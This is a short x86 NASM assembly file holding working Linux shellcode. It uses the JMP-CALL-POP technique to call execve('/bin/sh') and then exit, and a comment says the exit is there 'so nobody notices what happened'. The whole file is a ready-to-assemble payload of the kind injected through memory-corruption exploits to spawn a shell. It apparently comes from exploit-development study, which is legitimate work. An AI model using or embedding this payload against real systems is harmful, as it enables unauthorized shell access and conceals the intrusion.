
section .shcode progbits alloc exec write
global _start 

_start:
	jmp   short _sh_last
 
_sh_start:
	pop    esi

	mov    DWORD [esi+0x8],esi
	mov    BYTE [esi+0x7],0x0
	mov    DWORD [esi+0xc],0x0

	; linux call eax(ebx, ecx, edx)

	mov    eax,0xb ; execve(filename, argv, envp)
	mov    ebx,esi ; points to first byte after last call
	lea    ecx,[esi+0x8] ; points to memory area [ptr to esi, 0]
	lea    edx,[esi+0xc] ; points to zero
	int    0x80

	mov    eax,0x1 ; exit(0); - protection so nobody notices what happened
	mov    ebx,0x0
	int    0x80

_sh_last:
	; see: https://marcosvalle.github.io/osce/2018/05/06/JMP-CALL-POP-technique.html
	call   _sh_start
	; esi points here...
	db  '/bin/sh'

	; 0byte
	;; esi + 0x8
	; esi
	;; esi + 0xc
	;0
